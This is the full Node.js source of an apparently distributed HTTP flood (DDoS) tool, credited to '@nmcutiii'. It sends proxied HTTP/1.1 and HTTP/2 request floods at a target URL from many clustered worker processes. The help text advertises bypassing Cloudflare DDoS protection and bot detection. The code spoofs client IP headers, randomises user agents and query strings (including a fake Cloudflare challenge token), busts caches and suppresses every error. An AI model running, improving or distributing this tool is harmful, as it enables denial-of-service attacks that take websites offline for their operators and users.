//mix http 2 1,1
// Cải tiến thêm options lựa chọn http 2 và 1
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');
const { Buffer } = require('buffer');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
  .setMaxListeners(0)
  .on('uncaughtException', function (e) {
    console.log(e);
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
  })
  .on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
  })
  .on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
  })
  .on("SIGHUP", () => {
    return 1;
  })
  .on("SIGCHILD", () => {
    return 1;
  });

const statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4], 10);
setTimeout(() => {
  process.exit(1);
}, time * 1000);
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const connectFlag = process.argv.includes('--connect');
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? 
  (() => {
    const value = process.argv[forceHttpIndex + 1].toLowerCase();
    if (value === "mix" || value === "both") return "mix";
    if (value === "1" || value === "1.1" || value === "http1") return 1;
    if (value === "2" || value === "2.0" || value === "http2") return 2;
    return parseInt(value) || 2; // Default to HTTP/2 if invalid
  })() : 2;
// Thêm flag chọn TLS version: --tls 12|13|auto (mặc định auto)
const forceTlsIndex = process.argv.indexOf('--tls');
const forceTls = forceTlsIndex !== -1 && forceTlsIndex + 1 < process.argv.length ? String(process.argv[forceTlsIndex + 1]) : 'auto';
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;

// Additional performance options
const performanceIndex = process.argv.indexOf('--performance');
const performanceMode = performanceIndex !== -1 && performanceIndex + 1 < process.argv.length ? 
  process.argv[performanceIndex + 1].toLowerCase() : 'balanced';

const adaptiveIndex = process.argv.indexOf('--adaptive');
const adaptiveMode = adaptiveIndex !== -1;

// Enhanced HTTP version validation and logging
function validateHttpVersion() {
  const httpVersionMap = {
    1: 'HTTP/1.1 only',
    2: 'HTTP/2 only', 
    'mix': 'Both HTTP/1.1 and HTTP/2 (mixed mode)'
  };
  
  console.log(chalk.cyan(`[HTTP Version] Using: ${httpVersionMap[forceHttp] || 'HTTP/2 only'}`));
  
  if (forceHttp === 'mix') {
    console.log(chalk.yellow('[Performance] Mixed mode may use more resources but provides better compatibility'));
  } else if (forceHttp === 1) {
    console.log(chalk.yellow('[Performance] HTTP/1.1 mode - good for simple targets and older servers'));
  } else {
    console.log(chalk.green('[Performance] HTTP/2 mode - optimized for modern servers'));
  }
}

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
  console.clear();
  console.log(`${chalk.blue('NEW v3 Method With Luv // Updated: 06.18.2025 | Update: @nmcutiii')}`);
  console.log(`${chalk.blue('Join https://nmcutiii.info | https://nmcutiii.one to update ')}`);
  console.log(chalk.magenta.bold(`
    What's new:
      --Enhanced HTTP version selection with better performance
      --New header for bypass HTTPDDoS Cloudflare
      --Using TLS Chrome fingerprints
      --Bypass likely human
      --Bypass bot fight mode & manage definite bots
    `));
  console.error(chalk.yellow(`
    Options:
      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?randomstring 3 - ?q=fwfwwffw
      --cache - bypass cache cloudflare,...
      --debug - show your status code
      --delay <1-50> - Set delay
      --connect - keep proxy connection
      --tls 12|13|auto - Force TLS version (default: auto)
      --http 1|2|mix|both - Force HTTP version:
        1, 1.1, http1 = HTTP/1.1 only (better for simple targets)
        2, 2.0, http2 = HTTP/2 only (better for modern servers)
        mix, both = Both HTTP/1.1 and HTTP/2 (maximum compatibility)
        Default: 2 (HTTP/2)
      --performance low|balanced|high - Performance mode (default: balanced)
      --adaptive - Enable adaptive HTTP version selection based on target response
    `));

  console.log(chalk.red.underline('How to use & example:'));
  console.log(chalk.red.bold(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>`));
  console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --debug --cache`);
  console.log(`node ${process.argv[1]} POST "https://target.com" 60 8 50 proxy.txt --http mix --tls 13`);
  console.log(`node ${process.argv[1]} GET "http://target.com" 30 4 20 proxy.txt --http 1\n`);
  process.exit(1);
}

if (!fs.existsSync(proxyfile)) {
  console.error('Proxy file does not exist');
  process.exit(1);
}

const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(line => {
  const [host, port] = line.split(':');
  return host && port && !isNaN(port);
});
if (proxy.length === 0) {
  console.error('No valid proxies');
  process.exit(1);
}

// Log HTTP version selection
validateHttpVersion();

const getRandomChar = () => {
  const alphabet = 'abcdefghijklmnopqrstuvwxyz';
  const randomIndex = Math.floor(Math.random() * alphabet.length);
  return alphabet[randomIndex];
};
let randomPathSuffix = '';
setInterval(() => {
  randomPathSuffix = `${getRandomChar()}`;
}, 3333);
let hcookie = '';
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
  let frame = Buffer.alloc(9);
  frame.writeUInt32BE(payload.length << 8 | type, 0);
  frame.writeUInt8(flags, 4);
  frame.writeUInt32BE(streamId, 5);
  if (payload.length > 0)
    frame = Buffer.concat([frame, payload]);
  return frame;
}

function decodeFrame(data) {
  const lengthAndType = data.readUInt32BE(0);
  const length = lengthAndType >> 8;
  const type = lengthAndType & 0xFF;
  const flags = data.readUint8(4);
  const streamId = data.readUInt32BE(5);
  const offset = flags & 0x20 ? 5 : 0;

  let payload = Buffer.alloc(0);

  if (length > 0) {
    payload = data.subarray(9 + offset, 9 + offset + length);

    if (payload.length + offset != length) {
      return null;
    }
  }

  return {
    streamId,
    length,
    type,
    flags,
    payload
  };
}

function encodeSettings(settings) {
  const data = Buffer.alloc(6 * settings.length);
  for (let i = 0; i < settings.length; i++) {
    data.writeUInt16BE(settings[i][0], i * 6);
    data.writeUInt32BE(settings[i][1], i * 6 + 2);
  }
  return data;
}

function encodeRstStream(streamId, errorCode = 0) {
  const frameHeader = Buffer.alloc(9);
  frameHeader.writeUInt32BE(4, 0); // Payload length: 4 bytes
  frameHeader.writeUInt8(3, 4); // Type: RST_STREAM (0x03)
  frameHeader.writeUInt8(0, 5); // Flags: 0
  frameHeader.writeUInt32BE(streamId, 5); // Stream ID
  const payload = Buffer.alloc(4);
  payload.writeUInt32BE(errorCode, 0);
  return Buffer.concat([frameHeader, payload]);
}

function randstr(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

if (url.pathname.includes("%RAND%")) {
  const randomValue = randstr(6) + "&" + randstr(6);
  url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function shuffle(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Enhanced connection management with better HTTP version handling
function createConnection(proxyHost, proxyPort, httpVersion = null) {
  return new Promise((resolve, reject) => {
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
      netSocket.once('data', () => {
        resolve(netSocket);
      });
      
      // Use CONNECT method for HTTPS targets
      const targetPort = url.protocol === 'https:' ? 443 : (url.port || 80);
      netSocket.write(`CONNECT ${url.host}:${targetPort} HTTP/1.1\r\nHost: ${url.host}:${targetPort}\r\nConnection: Keep-Alive\r\nClient-IP: ${legitIP}\r\nX-Client-IP: ${legitIP}\r\nVia: 1.1 ${legitIP}\r\n\r\n`);
    });
    
    netSocket.on('error', reject);
    netSocket.on('close', () => reject(new Error('Connection closed')));
  });
}

// Enhanced HTTP version selection logic with performance optimization
function shouldUseHttpVersion(targetHttpVersion) {
  if (forceHttp === 'mix') {
    // In mixed mode, use weighted selection for better performance
    // HTTP/2 gets 70% weight, HTTP/1.1 gets 30% weight
    return Math.random() < 0.7 ? 2 : 1;
  }
  
  // Adaptive mode: adjust based on target response patterns
  if (adaptiveMode && forceHttp !== 1 && forceHttp !== 2) {
    return getAdaptiveHttpVersion();
  }
  
  return forceHttp;
}

// Adaptive HTTP version selection based on target characteristics
function getAdaptiveHttpVersion() {
  // Simple heuristics for adaptive selection
  const isModernTarget = url.hostname.includes('cdn') || 
                        url.hostname.includes('cloudflare') || 
                        url.hostname.includes('aws') ||
                        url.hostname.includes('google');
  
  const isSimpleTarget = url.hostname.includes('localhost') ||
                        url.hostname.match(/^\d+\.\d+\.\d+\.\d+$/); // IP address
  
  if (isModernTarget) {
    // Modern targets likely support HTTP/2 well
    return Math.random() < 0.8 ? 2 : 1;
  } else if (isSimpleTarget) {
    // Simple targets might work better with HTTP/1.1
    return Math.random() < 0.3 ? 2 : 1;
  } else {
    // Default balanced approach
    return Math.random() < 0.6 ? 2 : 1;
  }
}

// Performance configuration based on HTTP version and performance mode
function getPerformanceConfig(httpVersion) {
  // Base configuration based on performance mode
  let baseConfig;
  switch (performanceMode) {
    case 'low':
      baseConfig = {
        batchSize: isFull ? 30 : 20,
        delay: isFull ? 2000 : 2000 / ratelimit,
        maxConnections: 3
      };
      break;
    case 'high':
      baseConfig = {
        batchSize: isFull ? 200 : 100,
        delay: isFull ? 500 : 500 / ratelimit,
        maxConnections: 20
      };
      break;
    default: // balanced
      baseConfig = {
        batchSize: isFull ? 100 : 50,
        delay: isFull ? 1000 : 1000 / ratelimit,
        maxConnections: 10
      };
  }
  
  if (httpVersion === 1) {
    // HTTP/1.1 optimized settings
    return {
      ...baseConfig,
      batchSize: Math.min(baseConfig.batchSize, 30), // Smaller batches for HTTP/1.1
      delay: baseConfig.delay * 1.2, // Slightly longer delay
      maxConnections: Math.min(baseConfig.maxConnections, 5)
    };
  } else if (httpVersion === 2) {
    // HTTP/2 optimized settings
    return {
      ...baseConfig,
      batchSize: Math.min(baseConfig.batchSize * 2, 150), // Larger batches for HTTP/2
      delay: baseConfig.delay * 0.8, // Shorter delay
      maxConnections: Math.min(baseConfig.maxConnections * 2, 20)
    };
  }
  
  return baseConfig;
}

// Enhanced connection pooling for better performance
class ConnectionManager {
  constructor() {
    this.connections = new Map();
    this.maxConnectionsPerProxy = 5;
    this.performanceStats = new Map();
  }
  
  async getConnection(proxyHost, proxyPort, httpVersion = null) {
    const key = `${proxyHost}:${proxyPort}:${httpVersion || 'default'}`;
    
    if (!this.connections.has(key)) {
      this.connections.set(key, []);
    }
    
    const connections = this.connections.get(key);
    
    // Return existing connection if available
    if (connections.length > 0) {
      return connections.pop();
    }
    
    // Create new connection
    try {
      const connection = await createConnection(proxyHost, proxyPort, httpVersion);
      return connection;
    } catch (error) {
      throw error;
    }
  }
  
  returnConnection(proxyHost, proxyPort, connection, httpVersion = null) {
    const key = `${proxyHost}:${proxyPort}:${httpVersion || 'default'}`;
    
    if (!this.connections.has(key)) {
      this.connections.set(key, []);
    }
    
    const connections = this.connections.get(key);
    
    if (connections.length < this.maxConnectionsPerProxy) {
      connections.push(connection);
    } else {
      connection.destroy();
    }
  }
}

const connectionManager = new ConnectionManager();

// Enhanced main function with better HTTP version handling
async function go() {
  const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
  
  if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
    go();
    return;
  }

  // Determine which HTTP version to use
  const httpVersion = shouldUseHttpVersion();
  const perfConfig = getPerformanceConfig(httpVersion);
  
  try {
    if (url.protocol === 'http:' || forceHttp === 1) {
      // Use HTTP/1.1 for HTTP targets or when forced
      await handleHttp11(proxyHost, proxyPort, perfConfig);
    } else if (forceHttp === 2) {
      // Use HTTP/2 only
      await handleHttp2(proxyHost, proxyPort, perfConfig);
    } else if (forceHttp === 'mix') {
      // Use both HTTP/1.1 and HTTP/2 with different configs
      const http2Config = getPerformanceConfig(2);
      const http11Config = getPerformanceConfig(1);
      
      await Promise.all([
        handleHttp2(proxyHost, proxyPort, http2Config),
        handleHttp11(proxyHost, proxyPort, http11Config)
      ]);
    } else {
      // Default to HTTP/2
      await handleHttp2(proxyHost, proxyPort, perfConfig);
    }
  } catch (error) {
    // Handle connection errors gracefully
    setTimeout(() => go(), 100);
  }
}

// Enhanced HTTP/1.1 handler
async function handleHttp11(proxyHost, proxyPort, perfConfig = null) {
  const config = perfConfig || getPerformanceConfig(1);
  const netSocket = await connectionManager.getConnection(proxyHost, proxyPort, 'http11');
  
  if (url.protocol === 'http:') {
    // Direct HTTP/1.1 connection for HTTP targets
    const method = enableCache ? getRandomMethod() : reqmethod;
    const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
    const h1payl = `${method} ${path}${url.search || ''} HTTP/1.1\r\nHost: ${url.hostname}\r\nUser-Agent: ${userAgent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n${enableCache ? 'Cache-Control: no-cache, no-store, must-revalidate\r\n' : ''}Connection: keep-alive\r\n\r\n`;

    netSocket.write(h1payl, (err) => {
      if (!err) {
        setTimeout(() => {
          handleHttp11(proxyHost, proxyPort);
        }, isFull ? 1000 : 1000 / ratelimit);
      } else {
        netSocket.end(() => netSocket.destroy());
      }
    });

    netSocket.on('error', () => {
      netSocket.end(() => netSocket.destroy());
    });
  } else {
    // HTTPS with HTTP/1.1
    const tlsSocket = tls.connect({
      socket: netSocket,
      ALPNProtocols: ['http/1.1'],
      servername: url.hostname,
      rejectUnauthorized: false,
      minVersion: forceTls === '12' ? 'TLSv1.2' : (forceTls === '13' ? 'TLSv1.3' : 'TLSv1.2'),
      maxVersion: forceTls === '12' ? 'TLSv1.2' : (forceTls === '13' ? 'TLSv1.3' : 'TLSv1.3')
    }, () => {
      sendHttp11Requests(tlsSocket, proxyHost, proxyPort, config);
    });

    tlsSocket.on('error', () => {
      tlsSocket.destroy();
    });
  }
}

// Enhanced HTTP/2 handler
async function handleHttp2(proxyHost, proxyPort, perfConfig = null) {
  const config = perfConfig || getPerformanceConfig(2);
  const netSocket = await connectionManager.getConnection(proxyHost, proxyPort, 'http2');
  
  const tlsSocket = tls.connect({
    socket: netSocket,
    ALPNProtocols: ['h2', 'http/1.1'],
    servername: url.hostname,
    rejectUnauthorized: false,
    minVersion: forceTls === '12' ? 'TLSv1.2' : (forceTls === '13' ? 'TLSv1.3' : 'TLSv1.2'),
    maxVersion: forceTls === '12' ? 'TLSv1.2' : (forceTls === '13' ? 'TLSv1.3' : 'TLSv1.3')
  }, () => {
    if (tlsSocket.alpnProtocol === 'h2') {
      sendHttp2Requests(tlsSocket, proxyHost, proxyPort, config);
    } else {
      // Fallback to HTTP/1.1
      sendHttp11Requests(tlsSocket, proxyHost, proxyPort, config);
    }
  });

  tlsSocket.on('error', () => {
    tlsSocket.destroy();
  });
}

// Enhanced HTTP/1.1 request sender
function sendHttp11Requests(tlsSocket, proxyHost, proxyPort, config = null) {
  if (tlsSocket.destroyed) return;
  
  const perfConfig = config || getPerformanceConfig(1);
  
  const method = enableCache ? getRandomMethod() : reqmethod;
  const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
  
  const headers = [
    `Host: ${url.hostname}`,
    `User-Agent: ${userAgent}`,
    `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8`,
    `Accept-Encoding: gzip, deflate, br`,
    `Accept-Language: en-US,en;q=0.9`,
    `Connection: keep-alive`
  ];
  
  if (enableCache) {
    headers.push('Cache-Control: no-cache, no-store, must-revalidate');
    headers.push('Pragma: no-cache');
    headers.push('Expires: 0');
  }
  
  const h1payl = `${method} ${path}${url.search || ''} HTTP/1.1\r\n${headers.join('\r\n')}\r\n\r\n`;
  
  tlsSocket.write(h1payl, (err) => {
    if (!err) {
      setTimeout(() => {
        sendHttp11Requests(tlsSocket, proxyHost, proxyPort, perfConfig);
      }, perfConfig.delay);
    } else {
      tlsSocket.end(() => tlsSocket.destroy());
    }
  });
}

// Enhanced HTTP/2 request sender
function sendHttp2Requests(tlsSocket, proxyHost, proxyPort, config = null) {
  if (tlsSocket.destroyed) return;
  
  const perfConfig = config || getPerformanceConfig(2);
  
  let streamId = 1;
  let data = Buffer.alloc(0);
  let hpack = new HPACK();
  
  // HTTP/2 settings
  const settings = [
    [1, 4096],   // HEADER_TABLE_SIZE
    [2, 0],      // ENABLE_PUSH
    [3, 100],    // MAX_CONCURRENT_STREAMS
    [4, 65535],  // INITIAL_WINDOW_SIZE
    [5, 16384],  // MAX_FRAME_SIZE
    [6, 8192]    // MAX_HEADER_LIST_SIZE
  ];
  
  const frames = [
    Buffer.from(PREFACE, 'binary'),
    encodeFrame(0, 4, encodeSettings(settings))
  ];
  
  tlsSocket.write(Buffer.concat(frames));
  
  tlsSocket.on('data', (eventData) => {
    data = Buffer.concat([data, eventData]);
    
    while (data.length >= 9) {
      const frame = decodeFrame(data);
      if (frame != null) {
        data = data.subarray(frame.length + 9);
        
        if (frame.type === 4 && frame.flags === 0) {
          tlsSocket.write(encodeFrame(0, 4, "", 1));
        }
        
        if (frame.type === 1) {
          const status = hpack.decode(frame.payload).find(x => x[0] === ':status')[1];
          if (status === 403 || status === 400) {
            tlsSocket.write(encodeRstStream(0));
            tlsSocket.end(() => tlsSocket.destroy());
          }
          
          if (!statuses[status]) statuses[status] = 0;
          statuses[status]++;
        }
        
        if (frame.type === 7 || frame.type === 5) {
          tlsSocket.write(encodeRstStream(0));
          tlsSocket.end(() => tlsSocket.destroy());
        }
      } else {
        break;
      }
    }
  });
  
  // Send HTTP/2 requests
  function sendRequest() {
    if (tlsSocket.destroyed) return;
    
    const method = enableCache ? getRandomMethod() : reqmethod;
    const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
    
    const pseudoHeaders = [
      [":method", method],
      [":authority", url.hostname],
      [":scheme", "https"],
      [":path", path]
    ];
    
    const regularHeaders = [
      ["user-agent", userAgent],
      ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"],
      ["accept-encoding", "gzip, deflate, br"],
      ["accept-language", "en-US,en;q=0.9"]
    ];
    
    if (enableCache) {
      regularHeaders.push(["cache-control", "no-cache, no-store, must-revalidate"]);
      regularHeaders.push(["pragma", "no-cache"]);
    }
    
    const combinedHeaders = [...pseudoHeaders, ...regularHeaders];
    const packed = Buffer.concat([
      Buffer.from([0x80, 0, 0, 0, 0xFF]),
      hpack.encode(combinedHeaders)
    ]);
    
    const encodedFrame = encodeFrame(streamId, 1, packed, 0x25);
    tlsSocket.write(encodedFrame);
    
    streamId += 2;
    
    setTimeout(() => {
      sendRequest();
    }, perfConfig.delay);
  }
  
  sendRequest();
}

// Utility functions
function getRandomMethod() {
  const methods = ['POST', 'HEAD', 'GET'];
  return methods[Math.floor(Math.random() * methods.length)];
}

function generateCacheQuery() {
  const cacheBypass = [
    { 'cache-control': 'max-age=0' },
    { 'pragma': 'no-cache' },
    { 'expires': '0' },
    { 'x-bypass-cache': 'true' }
  ];
  
  const selected = cacheBypass[Math.floor(Math.random() * cacheBypass.length)];
  const queryParams = Object.entries(selected)
    .map(([key, value]) => `${key}=${value}`)
    .join('&');
  return `?${queryParams}`;
}

function handleQuery(queryType) {
  switch (queryType) {
    case '1':
      return `?cf__chl_tk=${randstr(32)}`;
    case '2':
      return `?${randstr(8)}=${randstr(16)}`;
    case '3':
      return `?q=${randstr(12)}`;
    default:
      return '';
  }
}

// Generate user agent
let rdversion = getRandomInt(130, 133);
const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`;

// Generate legit IP
const legitIP = generateLegitIP();
function generateLegitIP() {
  const asnData = [
    { asn: "AS15169", country: "US", ip: "8.8.8." },
    { asn: "AS8075", country: "US", ip: "13.107.21." },
    { asn: "AS14061", country: "SG", ip: "104.18.32." },
    { asn: "AS13335", country: "NL", ip: "162.158.78." },
    { asn: "AS16509", country: "DE", ip: "3.120.0." }
  ];
  
  const data = asnData[Math.floor(Math.random() * asnData.length)];
  return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

// Enhanced cluster management
if (cluster.isMaster) {
  const workers = {};
  const cpuCount = os.cpus().length;
  const workerCount = Math.min(threads, cpuCount * 2);

  console.log(chalk.cyan(`[Cluster] Starting ${workerCount} workers with HTTP version: ${forceHttp === 'mix' ? 'Mixed (HTTP/1.1 + HTTP/2)' : forceHttp === 1 ? 'HTTP/1.1 only' : 'HTTP/2 only'}`));

  Array.from({ length: workerCount }, (_, i) => {
    const worker = cluster.fork({
      core: i % cpuCount,
      workerId: i
    });
    workers[worker.id] = worker;
  });

  cluster.on('exit', (worker) => {
    console.log(chalk.yellow(`[Cluster] Worker ${worker.id} died, restarting...`));
    cluster.fork({ core: worker.id % os.cpus().length });
  });

  cluster.on('message', (worker, message) => {
    workers[worker.id] = [worker, message];
  });

  if (debugMode) {
    setInterval(() => {
      let statuses = {};
      for (let w in workers) {
        if (workers[w][0].state === 'online') {
          for (let st of workers[w][1]) {
            for (let code in st) {
              if (statuses[code] == null) statuses[code] = 0;
              statuses[code] += st[code];
            }
          }
        }
      }
      console.clear();
      console.log(`[${chalk.magenta.bold('JS/FUCKING')}] | ${chalk.bold('Time')}: [${chalk.cyan.bold(new Date().toLocaleString('en-US'))}] | ${chalk.bold('Status')}: [${chalk.cyan.bold(JSON.stringify(statuses))}]`);
    }, 1000);
  }

  if (!connectFlag) {
    setTimeout(() => process.exit(1), time * 1000);
  }
} else {
  // Worker process
  if (connectFlag) {
    const sendRequests = () => {
      go();
      setImmediate(sendRequests);
    };
    setImmediate(sendRequests);
  } else {
    let requestCount = 0;
    const maxRequests = 30000;

    const sendRequests = () => {
      if (requestCount < maxRequests) {
        requestCount++;
        go();
        setImmediate(sendRequests);
      }
    };
    setImmediate(sendRequests);
  }

  if (debugMode) {
    setInterval(() => {
      if (statusesQ.length >= 4) statusesQ.shift();
      statusesQ.push(statuses);
      statuses = {};
      process.send(statusesQ);
    }, 250);
  }

  setTimeout(() => process.exit(1), time * 1000);
}